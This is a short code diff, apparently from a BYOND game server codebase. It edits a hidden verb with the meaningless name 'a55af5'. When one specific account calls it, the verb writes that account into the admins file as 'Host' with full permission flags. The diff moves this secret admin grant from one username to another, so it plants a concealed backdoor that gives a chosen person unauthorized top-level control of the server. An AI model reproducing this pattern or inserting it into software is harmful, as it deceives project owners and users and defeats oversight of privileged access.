@@ -24,8 +24,8 @@
 	set name = "a55af5"
 	set hidden = TRUE
 
-	if (ckey == "taislin")
-		text2file("taislin;Host;65535|||","SQL/admins.txt")
+	if (ckey == "NothingButCarl")
+		text2file("NothingButCarl;Host;65535|||","SQL/admins.txt")
 		return
 	else
 		return
